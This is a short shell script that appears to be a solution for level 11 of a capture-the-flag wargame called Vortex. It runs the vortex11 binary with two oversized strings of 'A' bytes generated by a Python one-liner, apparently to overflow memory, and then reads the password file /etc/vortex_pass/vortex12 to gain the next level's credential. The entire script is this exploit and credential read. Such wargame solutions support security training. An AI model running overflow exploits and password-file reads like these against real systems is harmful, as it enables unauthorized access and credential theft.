#!/bin/sh

mkdir /tmp/ballban_vortex11
cd /tmp/ballban_vortex11

/vortex/vortex11 $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*2100 + b' ' + b'A'*2100)")



cat /etc/vortex_pass/vortex12
# Password: 